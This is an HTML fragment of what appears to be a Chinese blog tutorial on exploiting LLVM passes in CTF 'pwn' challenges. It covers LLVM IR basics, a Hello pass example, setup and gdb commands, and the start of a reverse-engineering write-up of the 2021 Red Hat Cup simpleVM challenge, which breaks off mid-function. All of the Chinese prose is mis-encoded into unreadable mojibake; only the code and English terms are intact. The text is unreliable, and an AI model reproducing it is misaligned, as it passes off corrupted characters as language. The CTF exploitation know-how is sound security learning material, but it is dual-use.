        <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><p>æ—¢ç„¶è¯´åˆ°<code>llvm pass pwn</code>ï¼Œæˆ‘ä»¬è‚¯å®šè¦å…ˆäº†è§£<code>llvm</code>åˆ°åº•æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿<br>å­¦è¿‡ç¼–è¯‘åŸç†çš„äººåº”è¯¥éƒ½çŸ¥é“ï¼Œç¼–è¯‘è¿‡ç¨‹ä¸»è¦å¯ä»¥åˆ’åˆ†ä¸ºå‰ç«¯ä¸åç«¯ï¼š  </p><ul><li>å‰ç«¯æŠŠæºä»£ç ç¿»è¯‘æˆä¸­é—´è¡¨ç¤º (<code>IR</code>)</li><li>åç«¯æŠŠIRç¼–è¯‘æˆç›®æ ‡å¹³å°çš„æœºå™¨ç ã€‚å½“ç„¶ï¼Œ<code>IR</code>ä¹Ÿå¯ä»¥ç»™è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œ</li></ul><p>ç„¶è€Œï¼Œç»å…¸çš„ç¼–è¯‘å™¨å¦‚<code>gcc</code>åœ¨è®¾è®¡ä¸Šéƒ½æ˜¯æä¾›ä¸€æ¡é¾™æœåŠ¡çš„ï¼š ä½ ä¸éœ€è¦çŸ¥é“å®ƒä½¿ç”¨çš„<code>IR</code>æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œå®ƒä¹Ÿä¸ä¼šæš´éœ²ä¸­é—´æ¥å£æ¥ç»™ä½ æ“ä½œå®ƒçš„<code>IR</code>ã€‚ æ¢å¥è¯è¯´ï¼Œä»å‰ç«¯åˆ°åç«¯ï¼Œè¿™äº›ç¼–è¯‘å™¨çš„å¤§é‡ä»£ç éƒ½æ˜¯å¼ºè€¦åˆçš„ã€‚  </p><p>è¿™æ ·åšæœ‰å¥½å¤„ä¹Ÿæœ‰åå¤„ã€‚å¥½å¤„æ˜¯ï¼Œå› ä¸ºä¸éœ€è¦æš´éœ²ä¸­é—´è¿‡ç¨‹çš„æ¥å£ï¼Œå®ƒå¯ä»¥åœ¨å†…éƒ¨åšä»»ä½•æƒ³åšçš„å¹³å°ç›¸å…³çš„ä¼˜åŒ–ã€‚ è€Œåå¤„æ˜¯ï¼Œæ¯å½“ä¸€ä¸ªæ–°çš„å¹³å°å‡ºç°ï¼Œè¿™äº›ç¼–è¯‘å™¨éƒ½è¦å„è‡ªä¸ºæ”¿å®ç°ä¸€ä¸ªä»è‡ªå·±çš„<code>IR</code>åˆ°æ–°å¹³å°çš„åç«¯ã€‚ ç”šè‡³å¦‚æœå½“ä¸€ç§æ–°è¯­è¨€å‡ºç°ï¼Œä¸”éœ€è¦å®ç°ä¸€ä¸ªæ–°çš„ç¼–è¯‘å™¨ï¼Œé‚£ä¹ˆå¯èƒ½éœ€è¦è®¾è®¡ä¸€ä¸ªæ–°çš„<code>IR</code>ï¼Œä»¥åŠé’ˆå¯¹å¤§éƒ¨åˆ†å¹³å°å®ç°è¿™ä¸ª<code>IR</code>çš„åç«¯ã€‚ ä¸å¦¨æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæœ‰Mç§è¯­è¨€ã€<code>N</code>ç§ç›®æ ‡å¹³å°ï¼Œé‚£ä¹ˆæœ€åæƒ…å†µä¸‹è¦å®ç° <code>M*N</code> ä¸ªå‰åç«¯ã€‚è¿™æ˜¯å¾ˆä½æ•ˆçš„ã€‚  </p><p>å› æ­¤ï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šæƒ³ï¼Œå¦‚æœå¤§å®¶éƒ½å…±ç”¨ä¸€ç§<code>IR</code>å‘¢ï¼Ÿ é‚£ä¹ˆæ¯å½“æ–°å¢åŠ ä¸€ç§è¯­è¨€ï¼Œæˆ‘ä»¬å°±åªè¦æ·»åŠ ä¸€ä¸ªè¿™ä¸ªè¯­è¨€åˆ°<code>IR</code>çš„å‰ç«¯ï¼› æ¯å½“æ–°å¢åŠ ä¸€ç§ç›®æ ‡å¹³å°ï¼Œæˆ‘ä»¬å°±åªè¦æ·»åŠ ä¸€ä¸ª<code>IR</code>åˆ°è¿™ä¸ªç›®æ ‡å¹³å°çš„åç«¯ã€‚ å¦‚æœæœ‰Mç§è¯­è¨€ã€Nç§ç›®æ ‡å¹³å°ï¼Œé‚£ä¹ˆæœ€ä¼˜æƒ…å†µä¸‹æˆ‘ä»¬åªè¦å®ç° <code>M+N</code> ä¸ªå‰åç«¯ã€‚  </p><p>è€Œ<code>LLVM</code>å°±æ˜¯è¿™æ ·ä¸€ä¸ªé¡¹ç›®ã€‚<code>LLVM</code>çš„æ ¸å¿ƒè®¾è®¡äº†ä¸€ä¸ªå« <code>LLVM IR</code> çš„ä¸­é—´è¡¨ç¤ºï¼Œ å¹¶ä»¥åº“(<code>Library</code>) çš„æ–¹å¼æä¾›ä¸€ç³»åˆ—æ¥å£ï¼Œ ä¸ºä½ æä¾›è¯¸å¦‚æ“ä½œ<code>IR</code>ã€ç”Ÿæˆç›®æ ‡å¹³å°ä»£ç ç­‰ç­‰åç«¯çš„åŠŸèƒ½ã€‚  </p><p>é‚£ä¹ˆ <code>LLVM Pass</code> åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ <code>Pass</code>å°±æ˜¯â€œéå†ä¸€é<code>IR</code>ï¼Œå¯ä»¥åŒæ—¶å¯¹å®ƒåšä¸€äº›æ“ä½œâ€çš„æ„æ€ã€‚ç¿»è¯‘æˆä¸­æ–‡åº”è¯¥å«â€œè¶Ÿâ€ã€‚ åœ¨å®ç°ä¸Šï¼Œ<code>LLVM</code>çš„æ ¸å¿ƒåº“ä¸­ä¼šç»™ä½ ä¸€äº› <code>Pass</code>ç±» å»ç»§æ‰¿ã€‚ä½ éœ€è¦å®ç°å®ƒçš„ä¸€äº›æ–¹æ³•ã€‚ æœ€åä½¿ç”¨<code>LLVM</code>çš„ç¼–è¯‘å™¨ä¼šæŠŠå®ƒç¿»è¯‘å¾—åˆ°çš„<code>IR</code>ä¼ å…¥<code>Pass</code>é‡Œï¼Œç»™ä½ éå†å’Œä¿®æ”¹ã€‚  </p><p>ä¸‹é¢åˆ—å‡ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å‘½ä»¤è¡Œå·¥å…·ï¼š  </p><ul><li><code>llvm-as</code>ï¼šæŠŠ<code>LLVM IR</code>ä»äººç±»èƒ½çœ‹æ‡‚çš„æ–‡æœ¬æ ¼å¼æ±‡ç¼–æˆäºŒè¿›åˆ¶æ ¼å¼ã€‚æ³¨æ„ï¼šæ­¤å¤„å¾—åˆ°çš„ä¸æ˜¯ç›®æ ‡å¹³å°çš„æœºå™¨ç ã€‚</li><li><code>llvm-dis</code>ï¼š<code>llvm-as</code>çš„é€†è¿‡ç¨‹ï¼Œå³åæ±‡ç¼–ã€‚ ä¸è¿‡è¿™é‡Œçš„åæ±‡ç¼–çš„å¯¹è±¡æ˜¯<code>LLVM IR</code>çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œè€Œä¸æ˜¯æœºå™¨ç ã€‚</li><li><code>opt</code>ï¼šä¼˜åŒ–<code>LLVM IR</code>ã€‚è¾“å‡ºæ–°çš„<code>LLVM IR</code>ã€‚</li><li><code>llc</code>ï¼šæŠŠ<code>LLVM IR</code>ç¼–è¯‘æˆæ±‡ç¼–ç ã€‚éœ€è¦ç”¨<code>as</code>è¿›ä¸€æ­¥å¾—åˆ°æœºå™¨ç ã€‚</li><li><code>lli</code>ï¼šè§£é‡Šæ‰§è¡Œ<code>LLVM IR</code>ã€‚</li></ul><p>ä¸‹é¢ç®€å•èŠèŠ<code>llvm IR</code>  </p><h2 id="ä½•ä¸ºLLVM-IR"><a href="#ä½•ä¸ºLLVM-IR" class="headerlink" title="ä½•ä¸ºLLVM IR"></a>ä½•ä¸ºLLVM IR</h2><ul><li><code>LVM IR</code> æ˜¯ä¸€é—¨ä½çº§ç¼–ç¨‹è¯­è¨€ï¼Œè¯­æ³•ç±»ä¼¼äºæ±‡ç¼–</li><li>ä»»ä½•é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚<code>C++</code>ï¼‰éƒ½å¯ä»¥ç”¨ <code>LLVM IR</code> è¡¨ç¤º</li><li>åŸºäº <code>LLVM IR</code> å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œä»£ç ä¼˜åŒ–(ä»»ä½•ç¼–ç¨‹è¯­è¨€éƒ½èƒ½ç»Ÿä¸€è½¬æ¢ä¸º<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="LLVM-IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"><a href="#LLVM-IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="LLVM IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"></a>LLVM IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•</h2><ul><li>äººç±»å¯ä»¥é˜…è¯»çš„æ–‡æœ¬å½¢å¼ï¼Œæ–‡ä»¶åç¼€ä¸º <code>.ll</code></li><li>æ˜“äºæœºå™¨å¤„ç†çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ–‡ä»¶åç¼€ä¸º <code>.bc</code></li></ul><p>ä¸‹é¢ç»™å‡ºä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼š  </p><ul><li>.c -&gt; .llï¼šclang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>ä¸‹é¢æ¥åˆ†æå®˜æ–¹æ–‡æ¡£ä¸­ä¸€ä¸ªå…¥é—¨çº§åˆ«çš„<code>llvm pass</code>ç¨‹åºï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// é‡å†™runOnFunctionï¼Œä½¿å¾—æ¯éå†åˆ°ä¸€ä¸ªå‡½æ•°æ—¶å°±è¾“å‡ºå‡½æ•°å</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// ä½¿ç”¨ RegisterPass å®æ³¨å†Œ Hello Passã€‚è¿™å…è®¸å®ƒé€šè¿‡å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™LLVMå·¥å…·</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ä¸»è¦å†…å®¹æ˜¯æ³¨å†Œäº†ä¸€ä¸ª<code>Hello</code>å‡½æ•°ï¼Œé‡å†™äº†<code>runOnFunction</code>å‡½æ•°ï¼Œä½¿å¾—æ¯éå†åˆ°ä¸€ä¸ªå‡½æ•°æ—¶å°±è¾“å‡ºå‡½æ•°åã€‚  </p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨<code>pwn</code>é¢˜ä¸­ï¼Œæ¼æ´ä¸»è¦æ¥è‡ªäº<code>so</code>æ–‡ä»¶ä¸­ï¼Œè€Œæ¼æ´å¤šäº§ç”Ÿäºé‡å†™äº†<code>so</code>æ–‡ä»¶ä¸­çš„<code>runOnFunction</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨<code>ida</code>ä¸­æœç´¢<code>vtable</code>æ¥å®šä½è¿™ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæˆ‘ä»¬è¦æ”»å‡»çš„åˆ™æ˜¯<code>opt</code>è¿™ä¸ª<code>elf</code>æ–‡ä»¶<br>è‡³äº<code>PASS</code>æ³¨å†Œçš„åç§°ï¼Œä¸€èˆ¬ä¼šåœ¨<code>README</code>æ–‡ä»¶ä¸­ç»™å‡ºï¼Œè‹¥æ˜¯æ²¡æœ‰ç»™å‡ºï¼Œå¯é€šè¿‡å¯¹<code>__cxa_atexit</code>å‡½æ•°â€œäº¤å‰å¼•ç”¨â€æ¥å®šä½  </p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä¸‹è½½å¸¸è§çš„<code>clang</code>å’Œ<code>llvm</code>ç‰ˆæœ¬  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>opt</code>æ˜¯<code>LLVM</code>çš„ä¼˜åŒ–å™¨å’Œåˆ†æå™¨ï¼Œå¯åŠ è½½æŒ‡å®šçš„æ¨¡å—ï¼Œå¯¹è¾“å…¥çš„<code>LLVM IR</code>æˆ–è€…<code>LLVM</code>å­—èŠ‚ç è¿›è¡Œä¼˜åŒ–æˆ–åˆ†æã€‚<code>CTF</code>é¢˜ç›®ä¸€èˆ¬ä¼šç»™å‡ºæ‰€éœ€ç‰ˆæœ¬çš„<code>opt</code>æ–‡ä»¶ï¼ˆå¯ç”¨<code>./opt --version</code>æŸ¥çœ‹ç‰ˆæœ¬ï¼‰æˆ–è€…åœ¨<code>README</code>æ–‡æ¡£ä¸­å‘ŠçŸ¥<code>opt</code>ç‰ˆæœ¬ã€‚å®‰è£…å¥½<code>llvm</code>åï¼Œå¯åœ¨<code>/usr/lib/llvm-xx/bin/opt</code>è·¯å¾„ä¸‹æ‰¾åˆ°å¯¹åº”<code>llvm</code>ç‰ˆæœ¬çš„<code>opt</code>æ–‡ä»¶ï¼ˆä¸€èˆ¬ä¸å¼€<code>PIE</code>ä¿æŠ¤ï¼‰  </p><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="çº¢å¸½æ¯-2021-simpleVM"><a href="#çº¢å¸½æ¯-2021-simpleVM" class="headerlink" title="[çº¢å¸½æ¯ 2021] simpleVM"></a>[çº¢å¸½æ¯ 2021] simpleVM</h2><p>å¥½ä¹ æƒ¯ï¼Œä¸Šæ¥å…ˆç»™<code>opt-8</code>æ¥ä¸€å‘<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç°ç¨‹åºå¹¶æ²¡æœ‰å¼€å¯<code>PIE</code>ä¿æŠ¤è€Œä¸”<code>got</code>è¡¨å¯æ”¹<br>å°†<code>VMPass.so</code>æ‹–è¿›<code>ida</code>ï¼Œæ¼æ´é€šå¸¸éƒ½åœ¨è¿™ä¸€ä¸ª<code>so</code>æ–‡ä»¶ä¸­<br>æˆ‘ä»¬é¦–å…ˆçœ‹<code>start</code>å‡½æ•°ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>PASS</code>æ³¨å†Œåç§°ä¸º<code>VMPass</code>ã€‚æˆ‘ä»¬å°è¯•åœ¨<code>ida</code>ä¸­æŸ¥æ‰¾<code>runOnFunction</code>å‡½æ•°ï¼Œç»“æœå‘ç°è¿™ä¸ªå‡½æ•°çš„ç¬¦å·è¡¨ç»™åˆ äº†ï¼Ÿå›¾ç‰‡ä¸­çš„<code>sub_6830</code>å‡½æ•°å³ä¸ºæˆ‘ä»¬è¦æ‰¾çš„<code>runOnFunction</code>å‡½æ•°å‡½æ•°  </p><img src="/2024/03/15/llvm/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹<code>runOnFunction</code>å‡½æ•°  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹å‡½æ•°å…ˆé€šè¿‡<code>getName(a2)</code>æ¥è·å–<code>.ll</code>æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°åå­—ï¼Œå¦‚æœè¯¥å‡½æ•°çš„åå­—ä¸º<code>o0o0o0o0</code>ï¼Œåˆ™ä¼šè¿›å…¥<code>sub_6AC0</code>è¿™ä¸ªå‡½æ•°è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†<br>å®šä½åˆ°å…³é”®å‡½æ•°<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] 